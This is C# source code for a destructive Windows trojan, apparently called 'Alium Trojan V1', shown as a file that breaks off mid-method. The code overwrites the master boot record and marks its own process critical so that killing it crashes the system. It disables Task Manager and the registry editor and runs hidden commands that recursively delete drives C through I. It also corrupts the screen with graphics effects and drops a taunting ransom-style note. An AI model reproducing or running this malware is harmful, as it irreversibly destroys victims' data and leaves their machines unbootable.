using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing;
using System.Media;

namespace AliumV1
{
    public class MainClass
    {
        //Required DLL native imports for GDI, MBR, and BSOD
        [DllImport("gdi32.dll")]
        static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
        [DllImport("gdi32.dll")]
        static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
        int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
        int yMask);
        [DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
        public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
       int nWidthDest, int nHeightDest,
       IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
       BLENDFUNCTION blendFunction);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(int crColor);
        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);
        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }

        //
        // currently defined blend operation
        //
        const int AC_SRC_OVER = 0x00;

        //
        // currently defined alpha format
        //
        const int AC_SRC_ALPHA = 0x01;

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
        }

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }

        //DLL import for BSOD
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        //DLL imports for MBR
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        //Cursor icon draw extract
        Icon iconOW1 = Extract("imageres.dll", 93, true);
        public static void Main()
        {
            //Resource folder creator
            Directory.CreateDirectory(@"C:\Program Files\Temp\SomethingSecret\Critical\Idk\Virus\Alium\Trojan\V1\Resources");

            //Note writer
            StreamWriter notewriter = new StreamWriter(@"C:\Program Files\Temp\SomethingSecret\Critical\Idk\Virus\Alium\Trojan\V1\Resources\Note.txt");
            notewriter.Write("Your computer has been trashed by the Alium Trojan version 1!\r\n\r\n");
            notewriter.Write("Your computer won't boot up anymore, and all your personal files have been deleted!\r\n\r\n");
            notewriter.Write("Don't try to reboot the computer or kill the Alium Trojan!\r\n\r\n");
            notewriter.Write("Doing that will cause your computer to be destroyed instantly and forever, so don't try it! :D\r\n\r\n\r\n");
            notewriter.Write("Good luck!\r\n\r\n");
            notewriter.WriteLine("-Ali Diaa");
            notewriter.Close();

            //BSOD
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            //Note
            Process.Start(@"C:\Program Files\Temp\SomethingSecret\Critical\Idk\Virus\Alium\Trojan\V1\Resources\Note.txt");

            //Note deleter, I don't know why. :)
            Thread.Sleep(1000);
            string note_path = @"C:\Program Files\Temp\SomethingSecret\Critical\Idk\Virus\Alium\Trojan\V1\Resources\Note.txt";
            if (File.Exists(note_path))
            {
                File.Delete(note_path);
            }

            //THREADS
            MainClass mbr_nonstatic = new MainClass();
            Thread mbr = new Thread(mbr_nonstatic.mbr_destroy);
            MainClass TunnelThreadClass = new MainClass();
            Thread TunnelThread = new Thread(TunnelThreadClass.TunnelMethod);
            MainClass FlashThreadClass = new MainClass();
            Thread FlashThread = new Thread(FlashThreadClass.ScreenFlashMethod);
            MainClass RandomSiteAppThreadClass = new MainClass();
            MainClass RandomErrorThreadClass = new MainClass();
            Thread RandomErrorThread = new Thread(RandomErrorThreadClass.RandomErrorMethod);
            Thread RandomSiteAppThread = new Thread(RandomSiteAppThreadClass.RandomSiteApp);
            MainClass FlipThreadClass = new MainClass();
            Thread FlipThread = new Thread(FlipThreadClass.FlipMethod);
            MainClass The2ndGDIphaseThreadClass = new MainClass();
            Thread The2ndGDIphaseThread = new Thread(The2ndGDIphaseThreadClass.The2ndGDIphaseMethod);
            MainClass rdop = new MainClass();
            Thread rdop2 = new Thread(rdop.rdop2);

            //To overwrite the MBR
            mbr.Start();

            //Disable task manager
            RegistryKey taskmgr = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            taskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

            //Disable registry editor
            RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

            //To RD other partitions
            rdop2.Start();

            //Random websites and applications
            Thread.Sleep(20000);
            RandomSiteAppThread.Start();

            //GDI
            Thread.Sleep(175000);
            RandomErrorThread.Start();

            //Screen flashing
            Thread.Sleep(15000);
            FlashThread.Start();

            //Flip
            Thread.Sleep(10000);
            FlipThread.Start();

            //Tunnel effect and more
            Thread.Sleep(20000);
            TunnelThread.Start();
        }
        public void mbr_destroy()
        {
            var mbrData = new byte[] {0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x0B, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
0xCD, 0x10, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x50, 0x43, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62,
0x65, 0x65, 0x6E, 0x20, 0x74, 0x72, 0x61, 0x73, 0x68, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x74,
0x68, 0x65, 0x20, 0x41, 0x6C, 0x69, 0x75, 0x6D, 0x20, 0x54, 0x72, 0x6F, 0x6A, 0x61, 0x6E, 0x20,
0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x20, 0x31, 0x21, 0x0D, 0x0A, 0x54, 0x68, 0x69, 0x73,
0x20, 0x76, 0x69, 0x72, 0x75, 0x73, 0x20, 0x69, 0x73, 0x20, 0x77, 0x72, 0x69, 0x74, 0x74, 0x65,
0x6E, 0x20, 0x62, 0x79, 0x20, 0x41, 0x6C, 0x69, 0x20, 0x44, 0x69, 0x61, 0x61, 0x2E, 0x20, 0x3A,
0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            try
            {
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                CloseHandle(mbr);
            }
            catch { }
        }
        public void RandomSiteApp()
        {
            //My YouTube channel
            Thread.Sleep(5000);
            ProcessStartInfo myytc = new ProcessStartInfo("https://youtube.com/channel/UCOUWPKEZoCpnYuPg19KA5rQ");
            Process.Start(myytc);

            //About the black hole TON 618
            Thread.Sleep(10000);
            ProcessStartInfo ton618 = new ProcessStartInfo("https://en.wikipedia.org/wiki/Ton_618");
            Process.Start(ton618);

            //CMD launch
            Thread.Sleep(10000);
            ProcessStartInfo cmdl = new ProcessStartInfo();
            cmdl.FileName = "cmd.exe";
            Process.Start(cmdl);

            //Write.exe launch
            Thread.Sleep(10000);
            ProcessStartInfo writeexel = new ProcessStartInfo();
            writeexel.FileName = "write.exe";
            Process.Start(writeexel);

            //Notepad launch
            Thread.Sleep(10000);
            ProcessStartInfo notepadl = new ProcessStartInfo();
            notepadl.FileName = "notepad.exe";
            Process.Start(notepadl);

            //Bonzi
            Thread.Sleep(10000);
            ProcessStartInfo bonzi = new ProcessStartInfo("https://www.google.com/search?q=Bonzi+Buddy+download+for+free");
            Process.Start(bonzi);

            //Minecraft hacks download no virus
            Thread.Sleep(10000);
            ProcessStartInfo mhdnv = new ProcessStartInfo("https://www.google.com/search?q=Minecraft+hacks+download+no+virus");
            Process.Start(mhdnv);

            //Free MP3 to MIDI
            Thread.Sleep(10000);
            ProcessStartInfo fmp3tmid = new ProcessStartInfo("https://www.google.com/search?q=Free+MP3+to+MIDI");
            Process.Start(fmp3tmid);

            //Avast VS AVG
            Thread.Sleep(10000);
            ProcessStartInfo avastvsavg = new ProcessStartInfo("https://www.google.com/search?q=Avast+vs+AVG");
            Process.Start(avastvsavg);

            //How to make virus
            Thread.Sleep(10000);
            ProcessStartInfo htmv = new ProcessStartInfo("https://www.google.com/search?q=How+to+make+a+virus");
            Process.Start(htmv);

            //Free GTA 5 download no virus 2022
            Thread.Sleep(10000);
            ProcessStartInfo fgta5dnv2022 = new ProcessStartInfo("https://www.google.com/search?q=Free+GTA+5+download+no+virus+2022");
            Process.Start(fgta5dnv2022);

            //Best memes 2022
            Thread.Sleep(10000);
            ProcessStartInfo bmemesf2022 = new ProcessStartInfo("https://www.google.com/search?q=Best+memes+2022");
            Process.Start(bmemesf2022);

            //Adobe apps for free 2022 safe no virus pls
            Thread.Sleep(10000);
            ProcessStartInfo adobe = new ProcessStartInfo("https://www.google.com/search?q=Adobe+apps+for+free+2022+safe+no+virus+please");
            Process.Start(adobe);

            //How to make my PC fast 2022 real and safe pls bro
            Thread.Sleep(10000);
            ProcessStartInfo pcfaster2022 = new ProcessStartInfo("https://www.google.com/search?q=How+to+make+my+PC+fast+2022+real+and+safe+please+bro");
            Process.Start(pcfaster2022);

            //How to hack a Facebook account real 2022 no lie
            Thread.Sleep(10000);
            ProcessStartInfo hackfb2022 = new ProcessStartInfo("https://www.google.com/search?q=How+to+hack+a+Facebook+account+real+2022+no+lie");
            Process.Start(hackfb2022);

            //Funny videos of 2022 if it didn't make me laugh I'll kill you Google
            Thread.Sleep(10000);
            ProcessStartInfo funnyvids2022 = new ProcessStartInfo("https://www.google.com/search?q=Funny+memes+of+2022%2C+if+it+didn%27t+make+me+laugh%2C+I%27ll+kill+you%2C+Google&sxsrf=ALiCzsY11-Sp-oL4yXcNOjHMTFWq8GfNdw%3A1651750413349&ei=DbZzYuDsFLCFxc8Pw6-K6Aw&ved=0ahUKEwigp5Tlocj3AhWwQvEDHcOXAs0Q4dUDCA0&uact=5&oq=Funny+memes+of+2022%2C+if+it+didn%27t+make+me+laugh%2C+I%27ll+kill+you%2C+Google&gs_lcp=Cgdnd3Mtd2l6EAMyBAgjECc6BwgAEEcQsAM6BwgjELACECdKBAhBGABKBAhGGABQywhYolpgj2JoAnABeACAAdwDiAGhCZIBBzAuNS40LTGYAQCgAQHIAQjAAQE&sclient=gws-wiz");
            Process.Start(funnyvids2022);

            //How to fix broken TV or computer screen at home for free real no fake stuff
            Thread.Sleep(10000);
            ProcessStartInfo fixbrokenscreen = new ProcessStartInfo("https://www.google.com/search?q=How+to+fix+broken+TV+or+computer+screen+at+home+for+free+real+no+fake+stuff");
            Process.Start(fixbrokenscreen);
        }
        public void reg_destroy()
        {
            ProcessStartInfo rdC = new ProcessStartInfo();
            rdC.FileName = "cmd.exe";
            rdC.WindowStyle = ProcessWindowStyle.Hidden;
            rdC.Arguments = @"/k rd C:\/s /q && exit";
            Process.Start(rdC);
        }
        public void rdop2()
        {
            ProcessStartInfo rdD = new ProcessStartInfo();
            rdD.FileName = "cmd.exe";
            rdD.WindowStyle = ProcessWindowStyle.Hidden;
            rdD.Arguments = @"/k rd d:\/s /q && exit";
            Process.Start(rdD);

            Thread.Sleep(5000);
            ProcessStartInfo rdE = new ProcessStartInfo();
            rdE.FileName = "cmd.exe";
            rdE.WindowStyle = ProcessWindowStyle.Hidden;
            rdE.Arguments = @"/k rd e:\/s /q && exit";
            Process.Start(rdE);

            Thread.Sleep(10000);
            ProcessStartInfo rdF = new ProcessStartInfo();
            rdF.FileName = "cmd.exe";
            rdF.WindowStyle = ProcessWindowStyle.Hidden;
            rdF.Arguments = @"/k rd f:\/s /q && exit";
            Process.Start(rdF);

            Thread.Sleep(15000);
            ProcessStartInfo rdG = new ProcessStartInfo();
            rdG.FileName = "cmd.exe";
            rdG.WindowStyle = ProcessWindowStyle.Hidden;
            rdG.Arguments = @"/k rd g:\/s /q && exit";
            Process.Start(rdG);

            Thread.Sleep(20000);
            ProcessStartInfo rdH = new ProcessStartInfo();
            rdH.FileName = "cmd.exe";
            rdH.WindowStyle = ProcessWindowStyle.Hidden;
            rdG.Arguments = @"/k rd h:\/s /q && exit";
            Process.Start(rdH);

            Thread.Sleep(25000);
            ProcessStartInfo rdI = new ProcessStartInfo();
            rdI.FileName = "cmd.exe";
            rdI.WindowStyle = ProcessWindowStyle.Hidden;
            rdI.Arguments = @"/k rd i:\/s /q && exit";
            Process.Start(rdI);
        }
        public void TunnelMethod()
        {
            for (int num = 0; num < 250; num++)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                Thread.Sleep(500);
            }
            clear_screen();

            //Tunnel but faster ;)
            for (int num = 0; num < 100; num++)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                Thread.Sleep(100);
            }
            clear_screen();

            //Tunnel, faster and faster!
            for (int num = 0; num < 250; num++)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                Thread.Sleep(10);
            }
            clear_screen();

            //Thread to begin the 2nd GDI phase
            Thread SecondGDI = new Thread(The2ndGDIphaseMethod);
            SecondGDI.Start();
        }
        public void ScreenFlashMethod()
        {
            //Box spam thread
            Thread boxspnthrd = new Thread(DumbBoxSpamLaunchMethod);
            boxspnthrd.Start();

            //Thread to draw icons behind cursor
            Thread IcoCurThrd = new Thread(CursorIconMethod);
            IcoCurThrd.Start();

            while (true)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
                Thread.Sleep(500);
            }
        }
        public void RandomErrorMethod()
        {
            while (true)
            {
                SystemSounds.Hand.Play();
                Thread.Sleep(300);
                SystemSounds.Exclamation.Play();
                Thread.Sleep(300);
                SystemSounds.Beep.Play();
                Thread.Sleep(300);
                SystemSounds.Asterisk.Play();
                Thread.Sleep(300);
                SystemSounds.Exclamation.Play();
                Thread.Sleep(300);
                SystemSounds.Hand.Play();
                Thread.Sleep(300);
                SystemSounds.Asterisk.Play();
                Thread.Sleep(300);
                SystemSounds.Beep.Play();
                Thread.Sleep(300);
            }
        }
        public void FlipMethod()
        {
            for (int num = 0; num < 100; num++)
            {
                //Flip horizontally
                IntPtr hwndH1 = GetDesktopWindow();
                IntPtr hdcH1 = GetWindowDC(hwndH1);
                int xH1 = Screen.PrimaryScreen.Bounds.Width;
                int yH1 = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdcH1, xH1, 0, -xH1, yH1, hdcH1, 0, 0, xH1, yH1, TernaryRasterOperations.SRCCOPY);
                Thread.Sleep(500);

                //Flip vertically
                IntPtr hwndV1 = GetDesktopWindow();
                IntPtr hdcV1 = GetWindowDC(hwndV1);
                int xV1 = Screen.PrimaryScreen.Bounds.Width;
                int yV1 = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdcV1, 0, yV1, xV1, -yV1, hdcV1, 0, 0, xV1, yV1, TernaryRasterOperations.SRCCOPY);
                Thread.Sleep(500);
            }
            clear_screen();

            //Faster flip
            for (; ; )
            {
                //Faster flip horizontally
                IntPtr hwndH2 = GetDesktopWindow();
                IntPtr hdcH2 = GetWindowDC(hwndH2);
                int xH2 = Screen.PrimaryScreen.Bounds.Width;
                int yH2 = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdcH2, xH2, 0, -xH2, yH2, hdcH2, 0, 0, xH2, yH2, TernaryRasterOperations.SRCCOPY);
                Thread.Sleep(250);

                //Faster flip vertically
                IntPtr hwndV2 = GetDesktopWindow();
                IntPtr hdcV2 = GetWindowDC(hwndV2);
                int xV2 = Screen.PrimaryScreen.Bounds.Width;
                int yV2 = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdcV2, 0, yV2, xV2, -yV2, hdcV2, 0, 0, xV2, yV2, TernaryRasterOperations.SRCCOPY);
                Thread.Sleep(250);
            }
        }
        public void The2ndGDIphaseMethod()
        {
            //System destroy thread
            Thread SysDestThrd = new Thread(reg_destroy);

            //Important
            Random r;
            r = new Random();
            //int count = 1000;
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            IntPtr desktop = GetDC(IntPtr.Zero);
            IntPtr rndcolor = CreateSolidBrush(0);
            IntPtr mhdc = CreateCompatibleDC(hdc);
            IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
            IntPtr holdbit = SelectObject(mhdc, hbit);
            POINT[] lppoint = new POINT[3];

            //Screen melting itself!
            for (int num = 0; num < 500; num++) //500, 2500
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, 0, r.Next(10), r.Next(x), y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                DeleteDC(hdc);
                if (r.Next(100) == 1) //30
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(r.Next(25));
            }

            clear_screen();

            for (int num = 0; num < 1000; num++)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x / 2), r.Next(y / 2), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(50);
            }
            clear_screen();

            //Faster
            for (int num = 0; num < 250; num++)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x / 2), r.Next(y / 2), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(25);
            }
            clear_screen();

            //Much faster
            for (int num = 0; num < 100; num++)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x / 2), r.Next(y / 2), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(10);
            }
            clear_screen();

            for (int num = 0; num < 500; num++) //5000
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                rndcolor = CreateSolidBrush(r.Next(1000)); //100000000
                SelectObject(hdc, rndcolor);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, TernaryRasterOperations.SRCINVERT);
                DeleteObject(rndcolor);
                DeleteDC(hdc);
                Thread.Sleep(5);
            }
            clear_screen();

            for (int num = 0; num < 500; num++)
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                rndcolor = CreateSolidBrush(r.Next(100000000));
                SelectObject(hdc, rndcolor);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                DeleteObject(rndcolor);
                DeleteDC(hdc);
                Thread.Sleep(10);
            }
            clear_screen();

            //System destroy
            SysDestThrd.Start();

            for (int num = 0; num < 250; num++) //5000
            {
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                rndcolor = CreateSolidBrush(r.Next(100000000));
                SelectObject(hdc, rndcolor);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                DeleteObject(rndcolor);
                DeleteDC(hdc);

                //Idk bro
                hwnd = GetDesktopWindow();
                hdc = GetWindowDC(hwnd);
                BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x / 2), r.Next(y / 2), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(10);
            }

            Environment.Exit(-1);
        }
        private void CursorIconMethod()
        {
            for (int num = 0; num < 5000; num++)
            {
                int posX = Cursor.Position.X;
                int posY = Cursor.Position.Y;
                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawIcon(iconOW1, posX, posY);
                }
                Thread.Sleep(10);
            }
        }
        public void clear_screen()
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(10);
            }
        }
        public void DumbBoxSpamMethod()
        {
            MessageBoxIcon msgboxico = MessageBoxIcon.Error;
